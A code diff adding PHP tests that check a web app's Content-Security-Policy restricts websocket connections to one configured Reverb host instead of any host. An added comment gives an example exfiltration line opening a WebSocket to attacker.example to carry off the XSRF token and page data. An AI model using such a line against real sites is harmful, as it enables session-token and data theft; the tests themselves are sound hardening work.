@@ -92,3 +92,42 @@ it('nonces the inline routes script so an enforcing csp does not break the app',
     preg_match("/'nonce-([A-Za-z0-9+\/=]+)'/", $csp, $m);
     expect($res->getContent())->toContain('nonce="'.$m[1].'"');
 });
+
+// `connect-src 'self' ws: wss:` allowed a websocket to any host on the internet, so the
+// exfiltration containment `default-src 'self'` exists for was void for that channel:
+// one `new WebSocket('wss://attacker.example/x')` carries the readable XSRF-TOKEN and
+// every Inertia page prop off the origin.
+
+it('names a concrete websocket origin instead of allowing every host', function () {
+    config([
+        'security.csp' => 'enforce',
+        'reverb.apps.apps.0.options' => ['host' => 'ws.registry.example.com', 'port' => 8080, 'scheme' => 'https'],
+    ]);
+
+    $policy = $this->get('/login')->headers->get('Content-Security-Policy');
+
+    expect($policy)->toContain("connect-src 'self' wss://ws.registry.example.com:8080")
+        ->and($policy)->not->toContain('ws:')
+        ->and($policy)->not->toContain(' wss: ');
+});
+
+it('falls back to the requested host when reverb runs on the app origin', function () {
+    config([
+        'security.csp' => 'enforce',
+        'reverb.apps.apps.0.options' => ['host' => null, 'port' => 443, 'scheme' => 'https'],
+    ]);
+
+    $policy = $this->get('/login')->headers->get('Content-Security-Policy');
+
+    expect($policy)->toContain("connect-src 'self' wss://localhost:443");
+});
+
+it('emits an insecure websocket origin only when reverb is configured for one', function () {
+    config([
+        'security.csp' => 'enforce',
+        'reverb.apps.apps.0.options' => ['host' => 'ws.internal', 'port' => 8080, 'scheme' => 'http'],
+    ]);
+
+    expect($this->get('/login')->headers->get('Content-Security-Policy'))
+        ->toContain("connect-src 'self' ws://ws.internal:8080");
+});
